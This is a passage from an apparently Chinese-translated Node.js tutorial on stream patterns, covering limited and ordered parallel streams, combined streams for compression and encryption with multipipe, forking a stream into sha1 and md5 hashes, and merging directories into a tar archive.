}\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这次在\u003ccode\u003e_transform()\u003c/code\u003e方法中，我们必须在调用\u003ccode\u003edone()\u003c/code\u003e之前检查是否达到了最大并行数量的限制，如果没有达到了限制，才能触发下一个项目的处理。如果我们已经达到最大并行数量的限制，我们可以简单地将\u003ccode\u003edone()\u003c/code\u003e回调保存到\u003ccode\u003econtinueCallback\u003c/code\u003e变量中，以便在任务完成后立即调用它。\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003e_flush()\u003c/code\u003e方法与\u003ccode\u003eParallelStream\u003c/code\u003e类保持完全一样，所以我们直接转到实现\u003ccode\u003e_onComplete()\u003c/code\u003e方法：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e_onComplete(err) {\n  \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.running--;\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(err) {\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.emit(\u003cspan class=\"hljs-string\"\u003e'error'\u003c/span\u003e, err);\n  }\n  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e tmpCallback = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.continueCallback;\n  \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.continueCallback = \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e;\n  tmpCallback \u0026amp;\u0026amp; tmpCallback();\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.running === \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e) {\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.terminateCallback \u0026amp;\u0026amp; \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.terminateCallback();\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e每当任务完成，我们调用任何已保存的\u003ccode\u003econtinueCallback()\u003c/code\u003e将导致\n\u003ccode\u003estream\u003c/code\u003e解锁，触发下一个项目的处理。\u003c/p\u003e\n\u003cp\u003e这就是\u003ccode\u003elimitedParallelStream\u003c/code\u003e模块。 我们现在可以在\u003ccode\u003echeckUrls\u003c/code\u003e模块中使用它来代替\u003ccode\u003eparallelStream\u003c/code\u003e，并且将我们的任务的并发限制在我们设置的值上。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e顺序并行执行\u003c/h4\u003e\n\u003cp\u003e我们以前创建的并行\u003ccode\u003eStreams\u003c/code\u003e可能会使得数据的顺序混乱，但是在某些情况下这是不可接受的。有时，实际上，有那种需要每个数据块都以接收到的相同顺序发出的业务场景。我们仍然可以并行运行\u003ccode\u003etransform\u003c/code\u003e函数。我们所要做的就是对每个任务发出的数据进行排序，使其遵循与接收数据相同的顺序。\u003c/p\u003e\n\u003cp\u003e这种技术涉及使用\u003ccode\u003ebuffer\u003c/code\u003e，在每个正在运行的任务发出时重新排序块。为简洁起见，我们不打算提供这样一个\u003ccode\u003estream\u003c/code\u003e的实现，因为这本书的范围是相当冗长的；我们要做的就是重用为了这个特定目的而构建的\u003ccode\u003enpm\u003c/code\u003e上的一个可用包，例如\u003ca target=\"_blank\" href=\"https://npmjs.org/package/through2-parallel\"\u003ethrough2-parallel\u003c/a\u003e。\u003c/p\u003e\n\u003cp\u003e我们可以通过修改现有的\u003ccode\u003echeckUrls\u003c/code\u003e模块来快速检查一个有序的并行执行的行为。 假设我们希望我们的结果按照与输入文件中的\u003ccode\u003eURL\u003c/code\u003e相同的顺序编写。 我们可以使用通过\u003ccode\u003ethrough2-parallel\u003c/code\u003e来实现：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e fs = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'fs'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e split = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'split'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e request = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'request'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e throughParallel = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'through2-parallel'\u003c/span\u003e);\n\nfs.createReadStream(process.argv[\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e])\n  .pipe(split())\n  .pipe(throughParallel.obj({\u003cspan class=\"hljs-attr\"\u003econcurrency\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e}, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003eurl, enc, done\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(!url) \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e done();\n    request.head(url, (err, response) =\u0026gt; {\n      \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.push(url + \u003cspan class=\"hljs-string\"\u003e' is '\u003c/span\u003e + (err ? \u003cspan class=\"hljs-string\"\u003e'down'\u003c/span\u003e : \u003cspan class=\"hljs-string\"\u003e'up'\u003c/span\u003e) + \u003cspan class=\"hljs-string\"\u003e'\\n'\u003c/span\u003e);\n      done();\n    });\n  }))\n  .pipe(fs.createWriteStream(\u003cspan class=\"hljs-string\"\u003e'results.txt'\u003c/span\u003e))\n  .on(\u003cspan class=\"hljs-string\"\u003e'finish'\u003c/span\u003e, () =\u0026gt; \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'All urls were checked'\u003c/span\u003e))\n;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e正如我们所看到的，\u003ccode\u003ethrough2-parallel\u003c/code\u003e的接口与\u003ccode\u003ethrough2\u003c/code\u003e的接口非常相似；唯一的不同是在\u003ccode\u003ethrough2-parallel\u003c/code\u003e还可以为我们提供的\u003ccode\u003etransform\u003c/code\u003e函数指定一个并发限制。如果我们尝试运行这个新版本的\u003ccode\u003echeckUrls\u003c/code\u003e，我们会看到\u003ccode\u003eresults.txt\u003c/code\u003e文件列出结果的顺序与输入文件中\nURLs的出现顺序是一样的。\u003c/p\u003e\n\u003cp\u003e通过这个，我们总结了使用\u003ccode\u003eStreams\u003c/code\u003e实现异步控制流的分析；接下来，我们研究管道模式。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e管道模式\u003c/h3\u003e\n\u003cp\u003e就像在现实生活中一样，\u003ccode\u003eNode.js\u003c/code\u003e的\u003ccode\u003eStreams\u003c/code\u003e也可以按照不同的模式进行管道连接。事实上，我们可以将两个不同的\u003ccode\u003eStreams\u003c/code\u003e合并成一个\u003ccode\u003eStreams\u003c/code\u003e，将一个\u003ccode\u003eStreams\u003c/code\u003e分成两个或更多的管道，或者根据条件重定向流。 在本节中，我们将探讨可应用于\u003ccode\u003eNode.js\u003c/code\u003e的\u003ccode\u003eStreams\u003c/code\u003e最重要的管道技术。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e组合的Streams\u003c/h4\u003e\n\u003cp\u003e在本章中，我们强调\u003ccode\u003eStreams\u003c/code\u003e提供了一个简单的基础结构来模块化和重用我们的代码，但是却漏掉了一个重要的部分：如果我们想要模块化和重用整个流水线？如果我们想要合并多个\u003ccode\u003eStreams\u003c/code\u003e，使它们看起来像外部的\u003ccode\u003eStreams\u003c/code\u003e，那该怎么办？下图显示了这是什么意思：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/1/160b1e8efb092002?w=1012\u0026amp;h=366\u0026amp;f=png\u0026amp;s=171111\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e从上图中，我们看到了如何组合几个流的了：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e当我们写入组合的\u003ccode\u003eStreams\u003c/code\u003e的时候，实际上我们是写入组合的\u003ccode\u003eStreams\u003c/code\u003e的第一个单元，即\u003ccode\u003eStreamA\u003c/code\u003e。\u003c/li\u003e\n\u003cli\u003e当我们从组合的\u003ccode\u003eStreams\u003c/code\u003e中读取信息时，实际上我们从组合的\u003ccode\u003eStreams\u003c/code\u003e的最后一个单元中读取。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e一个组合的\u003ccode\u003eStreams\u003c/code\u003e通常是一个多重的\u003ccode\u003eStreams\u003c/code\u003e，通过连接第一个单元的写入端和连接最后一个单元的读取端。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e要从两个不同的Streams（一个可读的Streams和一个可写入的Streams）中创建一个多重的Streams，我们可以使用一个npm模块，例如\u003ca target=\"_blank\" href=\"https://npmjs.org/package/duplexer2\"\u003eduplexer2\u003c/a\u003e。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e但上述这么做并不完整。实际上，组合的\u003ccode\u003eStreams\u003c/code\u003e还应该做到捕获到管道中任意一段\u003ccode\u003eStreams\u003c/code\u003e单元产生的错误。我们已经说过，任何错误都不会自动传播到管道中。 所以，我们必须有适当的错误管理，我们将不得不显式附加一个错误监听器到每个\u003ccode\u003eStreams\u003c/code\u003e。但是，组合的\u003ccode\u003eStreams\u003c/code\u003e实际上是一个黑盒，这意味着我们无法访问管道中间的任何单元，所以对于管道中任意单元的异常捕获，组合的\u003ccode\u003eStreams\u003c/code\u003e也充当聚合器的角色。\u003c/p\u003e\n\u003cp\u003e总而言之，组合的\u003ccode\u003eStreams\u003c/code\u003e具有两个主要优点：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e管道内部是一个黑盒，对使用者不可见。\u003c/li\u003e\n\u003cli\u003e简化了错误管理，因为我们不必为管道中的每个单元附加一个错误侦听器，而只需要给组合的\u003ccode\u003eStreams\u003c/code\u003e自身附加上就可以了。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e组合的\u003ccode\u003eStreams\u003c/code\u003e是一个非常通用和普遍的做法，所以如果我们没有任何特殊的需要，我们可能只想重用现有的解决方案，如\u003ca target=\"_blank\" href=\"https://www.npmjs.org/package/multipipe\"\u003emultipipe\u003c/a\u003e或\u003ca target=\"_blank\" href=\"https://www.npmjs.org/package/combine-stream\"\u003ecombine-stream\u003c/a\u003e。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e实现一个组合的Streams\u003c/h4\u003e\n\u003cp\u003e为了说明一个简单的例子，我们来考虑下面两个组合的\u003ccode\u003eStreams\u003c/code\u003e的情况：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e压缩和加密数据\u003c/li\u003e\n\u003cli\u003e解压和解密数据\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e使用诸如\u003ccode\u003emultipipe\u003c/code\u003e之类的库，我们可以通过组合一些核心库中已有的\u003ccode\u003eStreams\u003c/code\u003e（文件\u003ccode\u003ecombinedStreams.js\u003c/code\u003e）来轻松地构建组合的\u003ccode\u003eStreams\u003c/code\u003e：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e zlib = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'zlib'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e crypto = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'crypto'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e combine = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'multipipe'\u003c/span\u003e);\n\u003cspan class=\"hljs-built_in\"\u003emodule\u003c/span\u003e.exports.compressAndEncrypt = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003epassword\u003c/span\u003e =\u0026gt;\u003c/span\u003e {\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e combine(\n    zlib.createGzip(),\n    crypto.createCipher(\u003cspan class=\"hljs-string\"\u003e'aes192'\u003c/span\u003e, password)\n  );\n};\n\u003cspan class=\"hljs-built_in\"\u003emodule\u003c/span\u003e.exports.decryptAndDecompress = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003epassword\u003c/span\u003e =\u0026gt;\u003c/span\u003e {\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e combine(\n    crypto.createDecipher(\u003cspan class=\"hljs-string\"\u003e'aes192'\u003c/span\u003e, password),\n    zlib.createGunzip()\n  );\n};\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e例如，我们现在可以使用这些组合的数据流，如同黑盒，这些对我们均是不可见的，可以创建一个小型应用程序，通过压缩和加密来归档文件。 让我们在一个名为\u003ccode\u003earchive.js\u003c/code\u003e的新模块中做这件事：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e fs = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'fs'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e compressAndEncryptStream = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'./combinedStreams'\u003c/span\u003e).compressAndEncrypt;\nfs.createReadStream(process.argv[\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e])\n  .pipe(compressAndEncryptStream(process.argv[\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e]))\n  .pipe(fs.createWriteStream(process.argv[\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e] + \u003cspan class=\"hljs-string\"\u003e\".gz.enc\"\u003c/span\u003e));\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e我们可以通过从我们创建的流水线中构建一个组合的\u003ccode\u003eStream\u003c/code\u003e来进一步改进前面的代码，但这次并不只是为了获得对外不可见的黑盒，而是为了进行异常捕获。 实际上，正如我们已经提到过的那样，写下如下的代码只会捕获最后一个\u003ccode\u003eStream\u003c/code\u003e单元发出的错误：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003efs.createReadStream(process.argv[\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e])\n  .pipe(compressAndEncryptStream(process.argv[\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e]))\n  .pipe(fs.createWriteStream(process.argv[\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e] + \u003cspan class=\"hljs-string\"\u003e\".gz.enc\"\u003c/span\u003e))\n  .on(\u003cspan class=\"hljs-string\"\u003e'error'\u003c/span\u003e, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eerr\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-comment\"\u003e// 只会捕获最后一个单元的错误\u003c/span\u003e\n    \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(err);\n  });\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e但是，通过把所有的\u003ccode\u003eStreams\u003c/code\u003e结合在一起，我们可以优雅地解决这个问题。重构后的\u003ccode\u003earchive.js\u003c/code\u003e如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e combine = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'multipipe'\u003c/span\u003e);\n   \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e fs = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'fs'\u003c/span\u003e);\n   \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e compressAndEncryptStream =\n     \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'./combinedStreams'\u003c/span\u003e).compressAndEncrypt;\n   combine(\n     fs.createReadStream(process.argv[\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e])\n     .pipe(compressAndEncryptStream(process.argv[\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e]))\n     .pipe(fs.createWriteStream(process.argv[\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e] + \u003cspan class=\"hljs-string\"\u003e\".gz.enc\"\u003c/span\u003e))\n   ).on(\u003cspan class=\"hljs-string\"\u003e'error'\u003c/span\u003e, err =\u0026gt; {\n     \u003cspan class=\"hljs-comment\"\u003e// 使用组合的Stream可以捕获任意位置的错误\u003c/span\u003e\n     \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(err);\n   });\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e正如我们所看到的，我们现在可以将一个错误侦听器直接附加到组合的\u003ccode\u003eStreams\u003c/code\u003e，它将接收任何内部流发出的任何\u003ccode\u003eerror\u003c/code\u003e事件。\n现在，要运行\u003ccode\u003earchive\u003c/code\u003e模块，只需在命令行参数中指定\u003ccode\u003epassword\u003c/code\u003e和\u003ccode\u003efile\u003c/code\u003e参数，即压缩模块的参数：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003enode archive mypassword /path/to/a/file.text\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e通过这个例子，我们已经清楚地证明了组合的\u003ccode\u003eStream\u003c/code\u003e是多么重要; 从一个方面来说，它允许我们创建流的可重用组合，从另一方面来说，它简化了管道的错误管理。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e分开的\u003ccode\u003eStreams\u003c/code\u003e\u003c/h3\u003e\n\u003cp\u003e我们可以通过将单个可读的\u003ccode\u003eStream\u003c/code\u003e管道化为多个可写入的\u003ccode\u003eStream\u003c/code\u003e来执行\u003ccode\u003eStream\u003c/code\u003e的分支。当我们想要将相同的数据发送到不同的目的地时，这便体现其作用了，例如，两个不同的套接字或两个不同的文件。当我们想要对相同的数据执行不同的转换时，或者当我们想要根据一些标准拆分数据时，也可以使用它。如图所示：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/1/160b1e8eff79bcea?w=434\u0026amp;h=211\u0026amp;f=png\u0026amp;s=21128\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e在\u003ccode\u003eNode.js\u003c/code\u003e中分开的\u003ccode\u003eStream\u003c/code\u003e是一件小事。举例说明。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e实现一个多重校验和的生成器\u003c/h4\u003e\n\u003cp\u003e让我们创建一个输出给定文件的\u003ccode\u003esha1\u003c/code\u003e和\u003ccode\u003emd5\u003c/code\u003e散列的小工具。我们来调用这个新模块\u003ccode\u003egenerateHashes.js\u003c/code\u003e，看如下的代码：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e fs = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'fs'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e crypto = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'crypto'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e sha1Stream = crypto.createHash(\u003cspan class=\"hljs-string\"\u003e'sha1'\u003c/span\u003e);\nsha1Stream.setEncoding(\u003cspan class=\"hljs-string\"\u003e'base64'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e md5Stream = crypto.createHash(\u003cspan class=\"hljs-string\"\u003e'md5'\u003c/span\u003e);\nmd5Stream.setEncoding(\u003cspan class=\"hljs-string\"\u003e'base64'\u003c/span\u003e);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e目前为止没什么特别的 该模块的下一个部分实际上是我们将从文件创建一个可读的\u003ccode\u003eStream\u003c/code\u003e，并将其分叉到两个不同的流，以获得另外两个文件，其中一个包含\u003ccode\u003esha1\u003c/code\u003e散列，另一个包含\u003ccode\u003emd5\u003c/code\u003e校验和：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e inputFile = process.argv[\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e];\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e inputStream = fs.createReadStream(inputFile);\ninputStream\n  .pipe(sha1Stream)\n  .pipe(fs.createWriteStream(inputFile + \u003cspan class=\"hljs-string\"\u003e'.sha1'\u003c/span\u003e));\ninputStream\n  .pipe(md5Stream)\n  .pipe(fs.createWriteStream(inputFile + \u003cspan class=\"hljs-string\"\u003e'.md5'\u003c/span\u003e));\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这很简单：\u003ccode\u003einputStream\u003c/code\u003e变量通过管道一边输入到\u003ccode\u003esha1Stream\u003c/code\u003e，另一边输入到\u003ccode\u003emd5Stream\u003c/code\u003e。但是要注意：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e当\u003ccode\u003einputStream\u003c/code\u003e结束时，\u003ccode\u003emd5Stream\u003c/code\u003e和\u003ccode\u003esha1Stream\u003c/code\u003e会自动结束，除非当调用\u003ccode\u003epipe()\u003c/code\u003e时指定了\u003ccode\u003eend\u003c/code\u003e选项为\u003ccode\u003efalse\u003c/code\u003e。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003eStream\u003c/code\u003e的两个分支会接受相同的数据块，因此当对数据执行一些副作用的操作时我们必须非常谨慎，因为那样会影响另外一个分支。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e黑盒外会产生背压，来自\u003ccode\u003einputStream\u003c/code\u003e的数据流的流速会根据接收最慢的分支的流速作出调整。\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 class=\"heading\"\u003e合并的\u003ccode\u003eStreams\u003c/code\u003e\u003c/h3\u003e\n\u003cp\u003e合并与分开相对，通过把一组可读的\u003ccode\u003eStreams\u003c/code\u003e合并到一个单独的可写的\u003ccode\u003eStream\u003c/code\u003e里，如图所示：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/1/160b1e8efd24ea8a?w=459\u0026amp;h=217\u0026amp;f=png\u0026amp;s=20473\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e将多个\u003ccode\u003eStreams\u003c/code\u003e合并为一个通常是一个简单的操作; 然而，我们必须注意我们处理\u003ccode\u003eend\u003c/code\u003e事件的方式，因为使用自动结束选项的管道系统会在一个源结束时立即结束目标流。 这通常会导致错误，因为其他还未结束的源将继续写入已终止的\u003ccode\u003eStream\u003c/code\u003e。 解决此问题的方法是在将多个源传输到单个目标时使用选项\u003ccode\u003e{end：false}\u003c/code\u003e，并且只有在所有源完成读取后才在目标\u003ccode\u003eStream\u003c/code\u003e上调用\u003ccode\u003eend()\u003c/code\u003e。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e用多个源文件压缩为一个压缩包\u003c/h4\u003e\n\u003cp\u003e举一个简单的例子，我们来实现一个小程序，它根据两个不同目录的内容创建一个压缩包。 为此，我们将介绍两个新的\u003ccode\u003enpm\u003c/code\u003e模块：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://www.npmjs.com/package/tar\"\u003etar\u003c/a\u003e用来创建压缩包\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://www.npmjs.com/package/fstream\"\u003efstream\u003c/a\u003e从文件系统文件创建对象streams的库\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e我们创建一个新模块\u003ccode\u003emergeTar.js\u003c/code\u003e，如下开始初始化：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e tar = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'tar'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e fstream = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'fstream'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e path = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'path'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e destination = path.resolve(process.argv[\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e]);\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e sourceA = path.resolve(process.argv[\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e]);\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e sourceB = path.resolve(process.argv[\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e]);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e在前面的代码中，我们只加载全部依赖包和初始化包含目标文件和两个源目录(\u003ccode\u003esourceA\u003c/code\u003e和\u003ccode\u003esourceB\u003c/code\u003e)的变量。\u003c/p\u003e\n\u003cp\u003e接下来，我们创建\u003ccode\u003etar\u003c/code\u003e的\u003ccode\u003eStream\u003c/code\u003e并通过管道输出到一个可写入的\u003ccode\u003eStream\u003c/code\u003e：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e pack = tar.Pack();\npack.pipe(fstream.Writer(destination));\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e现在，我们开始初始化源\u003ccode\u003eStream\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e endCount = \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e;\n\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eonEnd\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (++endCount === \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e) {\n    pack.end();\n  }\n}\n\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e sourceStreamA = fstream.Reader({\n    \u003cspan class=\"hljs-attr\"\u003etype\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"Directory\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-attr\"\u003epath\u003c/span\u003e: sourceA\n  })\n  .on(\u003cspan class=\"hljs-string\"\u003e'end'\u003c/span\u003e, onEnd);\n\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e sourceStreamB = fstream.Reader({\n    \u003cspan class=\"hljs-attr\"\u003etype\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"Directory\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-attr\"\u003epath\u003c/span\u003e: sourceB\n  })\n  .on(\u003cspan class=\"hljs-string\"\u003e'end'\u003c/span\u003e, 